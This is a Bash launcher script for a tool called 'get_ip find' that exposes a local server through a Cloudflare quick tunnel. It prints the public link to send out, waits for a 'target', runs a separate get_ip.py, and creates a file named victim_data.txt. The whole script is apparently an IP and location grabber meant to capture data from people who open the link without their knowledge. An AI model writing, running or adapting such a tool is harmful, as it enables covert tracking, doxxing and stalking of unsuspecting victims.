#!/bin/bash

banner() {
    clear
    echo -e "\e[1;31m"
    echo "██████╗ ███████╗████████╗    ██╗██████╗ "
    echo "██╔════╝ ██╔════╝╚══██╔══╝    ██║██╔══██╗"
    echo "██║  ███╗█████╗     ██║       ██║██████╔╝"
    echo "██║   ██║██╔══╝     ██║       ██║██╔═══╝ "
    echo "╚██████╔╝███████╗   ██║       ██║██║     "
    echo " ╚═════╝ ╚══════╝   ╚═╝       ╚═╝╚═╝     "
    echo -e "\e[1;34m------------------------------------------"
    echo " Code by  : Mamun | Tool : get_ip find"
    echo " GitHub   : zxmoon76-sys | TikTok : mamun_islam_36"
    echo -e "------------------------------------------\e[0m"
}

check_hotspot() {
    # Hotspot alert logic
    hs_check=$(dumpsys connectivity | grep "tethering" | grep "state: 1" 2>/dev/null)
    if [[ -z "$hs_check" ]]; then
        echo -e "\e[1;31m[!] ALERT: Hotspot is OFF! Please turn it ON for Cloudflare.\e[0m"
    fi
}

banner
check_hotspot
touch victim_data.txt

echo -e "\e[1;32m[1]\e[0m Near You"
echo -e "\e[1;32m[2]\e[0m Location Founder"
echo -e "\e[1;32m[3]\e[0m Update"
echo -e "\e[1;31m[0]\e[0m Exit"
echo ""
read -p "Select option >> " opt

if [ "$opt" == "1" ] || [ "$opt" == "2" ]; then
    echo -e "\e[1;33m[*] Starting Tunnel...\e[0m"
    cloudflared tunnel --url http://127.0.0.1:8080 > link.log 2>&1 &
    CL_PID=$!
    sleep 8
    LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' link.log | head -n 1)
    
    banner
    echo -e "\e[1;32m[*] Public Link : \e[1;36m$LINK\e[0m"
    echo -e "-------------------------------------------------------"
    echo -e "\e[1;37m[*] Waiting for target... (Ctrl + C to Stop)\e[0m"
    
    python3 get_ip.py
    kill $CL_PID 2>/dev/null
    rm link.log
elif [ "$opt" == "3" ]; then
    echo -e "\e[1;32m[*] Tool is already up to date.\e[0m"
    exit
else
    exit
fi
